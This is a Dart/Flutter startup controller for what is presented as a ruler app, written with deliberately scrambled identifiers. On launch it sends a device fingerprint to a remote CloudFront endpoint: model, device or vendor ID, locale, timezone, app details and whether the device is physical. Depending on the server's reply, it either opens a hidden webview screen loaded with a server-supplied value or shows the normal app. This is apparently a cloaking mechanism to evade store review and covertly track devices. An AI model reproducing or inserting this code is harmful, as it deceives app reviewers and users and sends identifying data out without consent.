import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class RulerInitLogic extends GetxController {

  var kvfunzpao = RxBool(false);
  var ngucjp = RxBool(true);
  var nhpaizt = RxString("");
  var ykbat = RxBool(false);
  var dvgj = RxBool(true);
  final djevmfsgpc = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    sfnomr();
  }


  Future<void> sfnomr() async {
    ykbat.value = true;
    dvgj.value = true;
    ngucjp.value = false;

    djevmfsgpc.post("https://d2gjqp7det9t81.cloudfront.net/RRrcvNW",data: await chjiynpx()).then((value) {
      var toblp = value.data["toblp"] as String;
      var dobfka = value.data["dobfka"] as bool;
      if (dobfka) {
        nhpaizt.value = toblp;
        yfkjwho();
      } else {
        gheplsj();
      }
    }).catchError((e) {
      ngucjp.value = true;
      dvgj.value = true;
      ykbat.value = false;
    });
  }

  Future<Map<String, dynamic>> chjiynpx() async {
    final DeviceInfoPlugin wvpeoyk = DeviceInfoPlugin();
    PackageInfo bsfrciw_lbmpqk = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var njxqaz = Platform.localeName;
    var PqwLOIYh = currentTimeZone;

    var muHjWbw = bsfrciw_lbmpqk.packageName;
    var NemXzBLE = bsfrciw_lbmpqk.version;
    var XZnQai = bsfrciw_lbmpqk.buildNumber;

    var rIRY = bsfrciw_lbmpqk.appName;
    var jRJsWTKl = "";
    var kbhqVHKd  = "";
    var EwtRyHM = "";
    var jolmauq = "";
    var pyuamwsx = "";
    var jhyalwb = "";
    var xlvbeat = "";
    var nixjlwu = "";
    var vpikd = "";


    var segRb = "";
    var LWcAMqBH = false;

    if (GetPlatform.isAndroid) {
      segRb = "android";
      var ljrfqdh = await wvpeoyk.androidInfo;

      EwtRyHM = ljrfqdh.brand;

      jRJsWTKl  = ljrfqdh.model;
      kbhqVHKd = ljrfqdh.id;

      LWcAMqBH = ljrfqdh.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      segRb = "ios";
      var lbynhrdvxm = await wvpeoyk.iosInfo;
      EwtRyHM = lbynhrdvxm.name;
      jRJsWTKl = lbynhrdvxm.model;

      kbhqVHKd = lbynhrdvxm.identifierForVendor ?? "";
      LWcAMqBH  = lbynhrdvxm.isPhysicalDevice;
    }

    var res = {
      "vpikd" : vpikd,
      "rIRY": rIRY,
      "XZnQai": XZnQai,
      "muHjWbw": muHjWbw,
      "jhyalwb" : jhyalwb,
      "jRJsWTKl": jRJsWTKl,
      "PqwLOIYh": PqwLOIYh,
      "EwtRyHM": EwtRyHM,
      "kbhqVHKd": kbhqVHKd,
      "njxqaz": njxqaz,
      "segRb": segRb,
      "LWcAMqBH": LWcAMqBH,
      "jolmauq" : jolmauq,
      "pyuamwsx" : pyuamwsx,
      "xlvbeat" : xlvbeat,
      "NemXzBLE": NemXzBLE,
      "nixjlwu" : nixjlwu,

    };
    return res;
  }

  Future<void> gheplsj() async {
    Get.offNamed("/main");
  }

  Future<void> yfkjwho() async {
    Get.offNamed("/stats_dash");
  }

}
